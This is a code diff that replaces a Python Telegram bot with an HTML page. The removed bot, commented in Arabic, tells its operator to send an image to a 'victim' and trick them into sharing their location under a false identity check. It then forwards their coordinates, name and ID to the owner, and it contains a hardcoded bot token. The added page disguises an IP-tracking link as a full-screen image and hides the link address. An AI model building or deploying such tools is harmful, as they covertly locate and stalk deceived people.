@@ -1,134 +1,19 @@
-#!/usr/bin/env python3
-# SimpleTrackerBot - Shadow V99
-# بوت واحد فقط - يرسل صورة تطلب الموقع مباشرة
-
-import logging
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ContextTypes
-
-# ================== التكوينات ==================
-BOT_TOKEN = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY"
-OWNER_ID = 1772820433
-
-logging.basicConfig(level=logging.INFO)
-
-# ================== تخزين مؤقت ==================
-user_images = {}
-
-# ================== الأمر /start ==================
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "🎯 <b>بوت تعقب الموقع - Shadow V99</b>\n\n"
-        "📤 <b>كيفية الاستخدام:</b>\n"
-        "1. أرسل لي أي صورة\n"
-        "2. سأرسل لك الصورة مع زر طلب الموقع\n"
-        "3. أرسل هذه الصورة للضحية\n"
-        "4. عندما يضغط الضحية على الزر، سيطلب منه مشاركة موقعه\n"
-        "5. إذا وافق، سأرسل لك موقعه فوراً\n\n"
-        "<i>⚠️ ملاحظة: الضحية يجب أن يوافق على مشاركة الموقع</i>",
-        parse_mode="HTML"
-    )
-
-# ================== استقبال الصورة ==================
-async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    
-    # جلب الصورة
-    photo_file = await update.message.photo[-1].get_file()
-    photo_url = photo_file.file_path
-    
-    # حفظ رابط الصورة مؤقتاً
-    user_images[user_id] = photo_url
-    
-    # إنشاء زر طلب الموقع
-    keyboard = InlineKeyboardMarkup([
-        [InlineKeyboardButton("📍 مشاركة الموقع", callback_data=f"req_loc:{user_id}")]
-    ])
-    
-    # إرسال الصورة مع الزر
-    await update.message.reply_photo(
-        photo=photo_url,
-        caption="👇 اضغط على الزر لمشاركة موقعك",
-        reply_markup=keyboard
-    )
-
-# ================== معالج طلب الموقع ==================
-async def location_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    data = query.data
-    if data.startswith("req_loc:"):
-        owner_id = int(data.split(":")[1])
-        
-        # طلب الموقع من الضحية
-        keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("📍 مشاركة الموقع", callback_data=f"send_loc:{owner_id}")]
-        ])
-        
-        await query.edit_message_caption(
-            caption="🔐 يطلب منك مشاركة موقعك الحالي لتأكيد هويتك\n\nاضغط على الزر أدناه للموافقة",
-            reply_markup=keyboard
-        )
-    
-    elif data.startswith("send_loc:"):
-        owner_id = int(data.split(":")[1])
-        
-        # طلب الموقع من مستخدم التليجرام مباشرة
-        await query.edit_message_caption(
-            caption="📍 يرجى مشاركة موقعك باستخدام الزر أدناه",
-            reply_markup=None
-        )
-        
-        # إرسال زر مشاركة الموقع (feature متقدم)
-        await query.message.reply_location(
-            latitude=0, longitude=0,  # مؤقت
-            reply_markup=None
-        )
-        
-        # إرسال إشعار للمالك
-        await context.bot.send_message(
-            chat_id=owner_id,
-            text="✅ ضحية جديدة تتفاعل مع الصورة! جاري انتظار مشاركة الموقع..."
-        )
-
-# ================== استقبال الموقع من الضحية ==================
-async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    location = update.message.location
-    
-    # إرسال الموقع إلى المالك
-    await context.bot.send_location(
-        chat_id=OWNER_ID,
-        latitude=location.latitude,
-        longitude=location.longitude
-    )
-    
-    await context.bot.send_message(
-        chat_id=OWNER_ID,
-        text=f"📍 <b>تم تحديد موقع الضحية!</b>\n\n"
-             f"• <b>المستخدم:</b> {user.first_name}\n"
-             f"• <b>المعرّف:</b> <code>{user.id}</code>\n"
-             f"• <b>الإحداثيات:</b> {location.latitude}, {location.longitude}\n"
-             f"• <b>الدقة:</b> {location.horizontal_accuracy} متر (إذا كانت متاحة)\n"
-             f"• <b>رابط الخريطة:</b> https://www.google.com/maps?q={location.latitude},{location.longitude}",
-        parse_mode="HTML"
-    )
-    
-    # رد على الضحية
-    await update.message.reply_text("✅ تم إرسال موقعك بنجاح! شكراً لك.")
-
-# ================== التشغيل ==================
-def main():
-    app = Application.builder().token(BOT_TOKEN).build()
-    
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
-    app.add_handler(CallbackQueryHandler(location_request, pattern="^(req_loc|send_loc):"))
-    app.add_handler(MessageHandler(filters.LOCATION, handle_location))
-    
-    print("✅ البوت يعمل... أرسل له صورة الآن")
-    app.run_polling()
-
-if __name__ == "__main__":
-    main()
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>صورة 2026</title>
+    <!-- هذا الكود يجعل الصورة تأخذ كامل الشاشة ويخفي عنوان الرابط عند الضغط -->
+    <style>
+        body { margin: 0; padding: 0; overflow: hidden; }
+        a { display: block; width: 100%; height: 100%; }
+        img { width: 100%; height: 100%; object-fit: cover; }
+    </style>
+</head>
+<body>
+    <!-- الرابط الذي أنشأته في الخطوة رقم 1 ضعه هنا -->
+    <a href="https://iplocation.net/track?id=9Xz8Q1aB">
+        <img src="https://png.pngtree.com/png-vector/20220916/ourmid/pngtree-red-location-pin-icon-with-colored-folded-map-png-image_6177040.png" alt="صورة">
+    </a>
+</body>
+</html>
